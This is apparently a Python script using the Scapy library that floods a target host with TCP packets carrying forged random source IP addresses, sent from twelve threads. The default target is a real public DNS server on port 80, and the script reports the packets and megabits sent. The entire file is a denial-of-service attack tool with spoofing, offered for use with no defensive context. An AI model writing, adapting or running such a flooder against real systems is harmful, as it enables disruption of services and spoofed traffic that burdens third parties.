from scapy.all import *
import random
import threading
import signal

# Define the target IP address and port
target_ip = "8.8.8.8"  # Change this to the target's IP address
target_port = 80  # Change this to the target's port
num_threads = 12

total_packets_sent = 0
total_data_sent = 0
lock = threading.Lock()

# Function to send packets
def send_packets():
    global total_packets_sent, total_data_sent
    try:
        packets_to_send = 1000 // num_threads
        for _ in range(packets_to_send):
            random_source_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
            ip_packet = IP(src=random_source_ip, dst=target_ip)
            tcp_packet = TCP(sport=12345, dport=target_port, flags="SUP", seq=1001, window=5840)
            packet = ip_packet / tcp_packet
            send(packet, verbose=0)
        
            with lock:
                total_packets_sent += 1
                total_data_sent += len(packet)
    except KeyboardInterrupt:
        pass
    return total_data_sent, total_packets_sent


# Create multiple threads to send packets concurrently
threads = []
for _ in range(num_threads):  # You can adjust the number of threads as needed
    thread = threading.Thread(target=send_packets)
    threads.append(thread)
    thread.start()

# Wait for all threads to finish
for thread in threads:
    thread.join()

print(f"Packets sent : {total_packets_sent}")
print(f"Amount of bits sent :",(total_data_sent*8)/1000000,"Megabits.")